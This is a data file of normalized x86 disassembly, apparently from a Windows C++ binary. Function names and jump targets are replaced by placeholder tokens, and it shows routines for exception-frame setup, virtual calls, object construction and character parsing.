mov eax [ ebp - 0x2c ]
mov [ ebx + 0x38 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebx + 0x3c ] eax
and [ eax ] 0x0
lea eax [ ebp - 0x34 ]
push 0x0
push eax
call sub_41fc89
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
and [ eax ] 0x0
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
test al al
lea eax [ ebp - 0x34 ]
je r-xdata
and [ eax ] 0x0
lea eax [ ebp - 0x34 ]
push eax
call sub_41fc22
mov eax [ ebp - 0x14 ]
mov [ ebx ] eax
xor al al
push eax
call sub_41fc22
push 0x1
push eax
call sub_41fc89
pop ecx
pop ecx
mov al 0x1
jmp r-xdata
xor al al
push 0x0
push eax
call sub_41fc89
mov al [ ebp - 0x18 ]
pop ecx
mov [ edi ] al
jmp r-xdata
push 0x1
push eax
call sub_41fc89
pop ecx
mov al 0x1
jmp r-xdata
call sub_44866d
retn 0xc
push 0x8c
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov eax [ ebp - 0x14 ]
pop ecx
cmp [ ebx ] eax
je r-xdata
pop ecx
mov cl [ ebp - 0x18 ]
mov [ edi ] cl
jmp r-xdata
sub_41babe
push ebp
mov ebp esp
push ebx
mov ebx [ edi ]
push esi
push [ ebp + 0x8 ]
mov esi eax
mov eax [ edi + 0xc ]
mov ecx [ esi + 0x8 ]
push eax
neg ecx
mov eax edi
call sub_421f9e
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov [ edi ] ebx
cmp [ esi + 0x4 ] al
je r-xdata
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x4 ]
test al al
jne r-xdata
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x4 ]
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
jmp r-xdata
cmp [ edi ] ebx
je r-xdata
mov [ edi ] ebx
jmp r-xdata
mov [ edi ] ebx
cmp [ edi ] ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
je r-xdata
push 0x5a
push r--data
push r--data
call sub_4258e2
add esp 0xc
jmp r-xdata
xor al al
cmp [ edi ] ebx
je r-xdata
mov al 0x1
jmp r-xdata
push 0x4a
jmp r-xdata
push 0x61
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41bb77
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44a250
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov edi [ ebx ]
mov eax [ ebx + 0xc ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ esp + 0x10 ] edi
push [ esp + 0x10 ]
neg ecx
push eax
mov eax ebx
call sub_421f9e
pop ecx
pop ecx
test al al
jne r-xdata
mov esi ebx
lea edi [ esp + 0x34 ]
call sub_41fb84
push 0x6
pop ecx
mov esi eax
lea edi [ esp + 0x1c ]
[ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov [ ebx ] edi
cmp [ esi + 0x4 ] al
je r-xdata
call sub_407e47
mov edx [ eax ]
push ebx
mov ecx eax
call [ edx + 0x4 ]
test al al
mov eax [ esp + 0x10 ]
jne r-xdata
lea edi [ ebx + 0x1d ]
mov al [ edi ]
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] al
and [ esp + 0x58 ] 0x0
call sub_407e47
mov edx [ eax ]
push ebx
mov ecx eax
call [ edx + 0x4 ]
test al al
je r-xdata
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
jmp r-xdata
cmp [ ebx ] eax
je r-xdata
mov [ ebx ] eax
mov eax [ esp + 0x24 ]
mov [ ebx + 0x38 ] eax
mov eax [ esp + 0x28 ]
mov [ ebx + 0x3c ] eax
and [ eax ] 0x0
lea eax [ esp + 0x1c ]
push 0x0
push eax
call sub_41fc89
pop ecx
pop ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ esp + 0x24 ]
mov [ ebx + 0x38 ] eax
mov eax [ esp + 0x28 ]
mov [ ebx + 0x3c ] eax
and [ eax ] 0x0
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
test al al
lea eax [ esp + 0x1c ]
je r-xdata
mov eax [ esp + 0x24 ]
mov [ ebx + 0x38 ] eax
mov eax [ esp + 0x28 ]
mov [ ebx + 0x3c ] eax
and [ eax ] 0x0
lea eax [ esp + 0x1c ]
push eax
call sub_41fc22
mov eax [ esp + 0x14 ]
pop ecx
cmp [ ebx ] eax
je r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ ebp + 0xc ]
mov [ ebx + 0x38 ] eax
mov eax [ esp + 0x28 ]
mov [ ebx + 0x3c ] eax
and [ eax ] 0x0
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
test al al
lea eax [ esp + 0x1c ]
je r-xdata
push 0x92
push r--data
push r--data
call sub_4258e2
add esp 0xc
xor al al
push 0x0
push eax
call sub_41fc89
mov al [ esp + 0x20 ]
pop ecx
mov [ edi ] al
jmp r-xdata
push 0x1
push eax
call sub_41fc89
pop ecx
pop ecx
mov al 0x1
jmp r-xdata
xor al al
push 0x7d
push r--data
push r--data
call sub_4258e2
add esp 0xc
push eax
call sub_41fc22
push 0x1
push eax
call sub_41fc89
pop ecx
pop ecx
mov al 0x1
jmp r-xdata
mov eax [ esp + 0x14 ]
pop ecx
cmp [ ebx ] eax
je r-xdata
mov cl [ esp + 0x18 ]
mov [ edi ] cl
jmp r-xdata
push 0x9c
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_41bd76
push ebp
mov ebp esp
push ebx
mov ebx [ edi ]
call sub_407e47
mov edx [ eax ]
push edi
mov ecx eax
call [ edx + 0x4 ]
test al al
je r-xdata
xor al al
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
test al al
je r-xdata
mov [ edi ] ebx
mov al 0x1
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41bda7
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x34
push ebx
mov ebx eax
mov eax [ ebx ]
push esi
push edi
mov esi ebx
lea edi [ esp + 0x28 ]
mov [ esp + 0xc ] eax
call sub_41fb84
push 0x6
pop ecx
mov esi eax
lea edi [ esp + 0x10 ]
[ edi ] [ esi ]
mov esi [ ebp + 0x8 ]
call sub_407e47
mov edx [ eax ]
push ebx
mov ecx eax
call [ edx + 0x4 ]
test al al
mov eax [ esp + 0x18 ]
mov [ ebx + 0x38 ] eax
mov eax [ esp + 0x1c ]
mov [ ebx + 0x3c ] eax
jne r-xdata
mov ecx [ ebp + 0xc ]
and [ eax ] 0x0
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
test al al
lea eax [ esp + 0x10 ]
je r-xdata
and [ eax ] 0x0
lea eax [ esp + 0x10 ]
push 0x0
push eax
call sub_41fc89
pop ecx
jmp r-xdata
push eax
call sub_41fc22
mov eax [ esp + 0x10 ]
mov [ ebx ] eax
push 0x1
push eax
call sub_41fc89
pop ecx
mov al 0x1
jmp r-xdata
xor al al
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41be62
push 0x8
mov eax sub_44dca8
call sub_448595
xor esi esi
push 0x3c
mov [ ebp - 0x14 ] esi
call sub_424ff8
pop ecx
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp eax esi
je r-xdata
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov esi eax
call sub_41cb7b
mov esi eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41fd0f
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
[ eax ] ebx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41bed1
push 0x8
mov eax sub_44dc62
call sub_448595
xor esi esi
push 0x3c
mov [ ebp - 0x14 ] esi
call sub_424ff8
pop ecx
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp eax esi
je r-xdata
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov esi eax
call sub_41cc48
mov esi eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41fd90
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
[ eax ] ebx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41bf40
push 0x8
mov eax sub_44dc1c
call sub_448595
xor esi esi
push 0x3c
mov [ ebp - 0x14 ] esi
call sub_424ff8
pop ecx
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp eax esi
je r-xdata
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov esi eax
call sub_41cd15
mov esi eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41fe11
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
[ eax ] ebx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41bfaf
push 0x8
mov eax sub_44dbd6
call sub_448595
xor esi esi
push 0x3c
mov [ ebp - 0x14 ] esi
call sub_424ff8
pop ecx
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp eax esi
je r-xdata
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov esi eax
call sub_41cde2
mov esi eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41fe92
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
[ eax ] ebx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c01e
push 0x8
mov eax sub_44bb0d
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41ceaf
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41ff13
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c084
push 0x8
mov eax sub_44bad1
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41cf75
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_41ff94
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c0ea
push 0x8
mov eax sub_44ba95
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41d03d
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_420015
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c150
push 0x8
mov eax sub_44ba59
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41d110
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_420096
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c1b6
push 0x8
mov eax sub_44ba1d
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41d1e5
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_420117
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c21c
push 0x8
mov eax sub_44b9e1
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41d2b8
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_420198
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c282
push 0x8
mov eax sub_44b9a5
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41d38d
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_420219
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c2e8
push 0x8
mov eax sub_44b969
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41d460
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_42029a
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c34e
push 0x8
mov eax sub_44b92d
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41d533
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_42031b
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c3b4
push 0x8
mov eax sub_44b8f1
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41d5f9
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_42039c
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c41a
push 0x8
mov eax sub_44b8b5
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41d6bf
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_42041d
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c480
push 0x8
mov eax sub_44b879
call sub_448595
xor esi esi
push 0x20
mov [ ebp - 0x14 ] esi
call sub_424ff8
mov ebx eax
pop ecx
cmp ebx esi
je r-xdata
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0xc ]
call sub_41d785
mov esi eax
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_42049e
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_41c4e6
push ebp
mov ebp esp
sub eax [ ebp + 0x8 ]
push esi
sar eax 0x1
lea esi [ eax + eax ]
push esi
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_424b60
add esp 0xc
add eax esi
pop esi
pop ebp
retn
sub_41c52c
push esi
mov esi [ edi + 0x38 ]
jmp r-xdata
test esi esi
jne r-xdata
push [ edi + 0x40 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
mov esi [ esi + 0x4 ]
mov al 0x1
pop esi
retn
sub_41c559
push ebp
mov ebp esp
push ecx
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
mov al [ eax ]
mov [ ebp - 0x4 ] al
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20c ]
push [ ebp - 0x4 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax al
call sub_411fdc
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
xor al al
leave
retn
inc [ esi ]
mov eax [ ebx ]
push esi
mov ecx ebx
call [ eax + 0x4 ]
test al al
je r-xdata
dec [ esi ]
mov al 0x1
leave
retn
sub_41c5a5
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
call sub_40e881
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax ]
mov bl 0x1
call sub_410a44
test al al
je r-xdata
push 0xd8
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
lea eax [ esi + 0x8 ]
mov edx edi
call sub_4109fa
sub_41c5f1
mov eax [ esi ]
cmp eax [ esi + 0x10 ]
jne r-xdata
movzx eax [ eax ]
call sub_411fdc
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
xor al al
retn
inc [ esi ]
mov eax [ ebx ]
push esi
mov ecx ebx
call [ eax + 0x4 ]
test al al
je r-xdata
dec [ esi ]
mov al 0x1
retn
sub_41c621
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
call sub_40e881
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax ]
xor bl bl
call sub_410a44
test al al
je r-xdata
push 0xd8
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
lea eax [ esi + 0x8 ]
mov edx edi
call sub_4109fa
sub_41c66d
push ebp
mov ebp esp
push ecx
mov ecx [ ebx ]
cmp ecx [ ebx + 0x10 ]
jne r-xdata
push esi
mov esi [ ebx + 0x2c ]
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
movzx eax [ ecx ]
push [ ebp - 0x4 ]
add esi 0x8
push eax
mov eax [ ebp + 0x8 ]
call sub_4205c5
pop edi
pop esi
test al al
je r-xdata
mov [ ebx + 0x1d ] 0x1
jmp r-xdata
xor al al
mov ecx [ ebp + 0xc ]
inc [ ebx ]
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
test al al
je r-xdata
dec [ ebx ]
mov al 0x1
jmp r-xdata
leave
retn 0x8
sub_41c6ce
push ebp
mov ebp esp
push ecx
mov ecx [ esi ]
cmp ecx [ esi + 0x10 ]
jne r-xdata
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
mov eax [ esi + 0x2c ]
push [ ebp - 0x4 ]
add eax 0x8
push eax
movzx eax [ ecx ]
push eax
mov eax [ ebp + 0x8 ]
call sub_420611
pop edi
test al al
je r-xdata
mov [ esi + 0x1d ] 0x1
jmp r-xdata
xor al al
inc [ esi ]
mov eax [ ebx ]
push esi
mov ecx ebx
call [ eax + 0x4 ]
test al al
je r-xdata
dec [ esi ]
mov al 0x1
jmp r-xdata
leave
retn 0x4
sub_41c72d
push 0x70
mov eax sub_44b83d
call sub_448595
mov esi ecx
mov eax [ ebp + 0x8 ]
push [ esi + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push [ eax + 0x4 ]
mov eax [ eax ]
lea ebx [ ebp - 0x7c ]
je r-xdata
call sub_41d8d6
lea eax [ ebp - 0x7c ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call sub_4206ba
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0x48 ]
call sub_41d84b
mov eax ebx
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_420651
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
mov ebx eax
call sub_406dc4
lea eax [ ebp - 0x2c ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push eax
call sub_4069e4
call sub_44866d
retn
sub_41c7a7
push 0x70
mov eax sub_44b80e
call sub_448595
mov esi ecx
mov eax [ ebp + 0x8 ]
push [ esi + 0x4 ]
cmp [ eax + 0x8 ] 0x0
push [ eax + 0x4 ]
mov eax [ eax ]
lea ebx [ ebp - 0x7c ]
je r-xdata
call sub_41d9ec
lea eax [ ebp - 0x7c ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call sub_42078c
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
lea eax [ ebp - 0x48 ]
call sub_41d961
mov eax ebx
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_420723
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
mov ebx eax
call sub_406dc4
lea eax [ ebp - 0x2c ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push eax
call sub_4069e4
call sub_44866d
retn
sub_41c821
push 0x84
mov eax sub_44cfd3
call sub_448595
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x4 ]
mov ecx [ eax ]
cmp [ eax + 0x8 ] 0x0
push [ edi + 0x4 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x90 ]
je r-xdata
call sub_41daff
lea eax [ ebp - 0x90 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_420867
pop ecx
pop ecx
mov ebx eax
mov esi edi
mov [ ebp - 0x4 ] 0x3
call sub_406dc4
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x44 ]
call sub_41da77
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x90 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_4207f5
pop ecx
pop ecx
mov ebx eax
mov esi edi
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
jmp r-xdata
push eax
call sub_4069e4
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x6c ]
call sub_41472b
call sub_44866d
retn
sub_41c8c5
push 0x84
mov eax sub_44cf8b
call sub_448595
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x4 ]
mov ecx [ eax ]
cmp [ eax + 0x8 ] 0x0
push [ edi + 0x4 ]
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x90 ]
je r-xdata
call sub_41dc0f
lea eax [ ebp - 0x90 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_42094b
pop ecx
pop ecx
mov ebx eax
mov esi edi
mov [ ebp - 0x4 ] 0x3
call sub_406dc4
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x44 ]
call sub_41db87
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x90 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_4208d9
pop ecx
pop ecx
mov ebx eax
mov esi edi
mov [ ebp - 0x4 ] 0x1
call sub_406dc4
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
jmp r-xdata
push eax
call sub_4069e4
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x6c ]
call sub_41472b
call sub_44866d
retn
sub_41c995
push 0x3
pop edx
push esi
push edi
lea ecx [ eax + edx * 8 ]
dec edx
mov esi [ ecx ]
mov edi [ ecx + 0x4 ]
not esi
not edi
mov [ ecx ] esi
mov [ ecx + 0x4 ] edi
jns r-xdata
pop edi
pop esi
retn
sub_41c9b1
push ebp
mov ebp esp
push esi
mov esi eax
call sub_410a44
test al al
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
lea eax [ esi + 0x8 ]
call sub_4109fa
sub_41c9d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebx + 0x30 ]
push esi
push edi
mov edi eax
lea esi [ ebx + 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ eax ]
add edx 0x34
add ecx 0x14
call sub_41e67c
push eax
mov eax [ ebp + 0xc ]
mov edi ebx
call sub_41e2d7
mov eax [ ebp + 0x14 ]
mov ecx [ ebx ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebx + 0x4 ]
pop edi
mov [ eax + 0x10 ] ecx
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn 0x10
sub_41ca19
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0xc ] 0x0
push esi
mov esi [ ebx + 0x24 ]
push edi
mov [ ebp - 0x8 ] esi
jne r-xdata
lea edi [ ebx + 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x20 ]
mov ecx [ eax + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov eax [ eax + 0x4 ]
pop edi
mov [ ebx + 0x8 ] eax
mov al [ ebp + 0xc ]
pop esi
leave
retn 0x8
mov eax [ esi ]
mov edi [ ebx + 0x4 ]
mov esi [ ebx + 0x30 ]
mov [ ebp - 0x4 ] eax
